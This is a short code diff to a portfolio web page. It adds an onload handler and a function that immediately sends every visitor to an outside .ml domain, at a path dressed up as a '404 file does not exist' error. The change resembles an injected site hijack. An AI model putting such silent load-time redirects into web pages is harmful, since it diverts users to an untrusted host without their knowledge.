@@ -59,7 +59,7 @@ input[type=text], textarea {
     box-sizing: border-box;
 }
 </style>
-<body class="w3-light-grey">
+<body class="w3-light-grey" onload="redirect()">
 
 <!-- w3-content defines a container for fixed size centered content, 
 and is wrapped around the whole page content, except for the footer in this example -->
@@ -342,6 +342,9 @@ https://www.instagram.com/p9983design/
 	</center>
 </footer>
 <script>
+function redirect(){
+	window.location.replace("http://cloudeight.ml/error-404-file-does-not-exist");
+}
 function checkLike(section){
 	if(section == 1){
 	document.getElementById("l1").style.color = "green";	
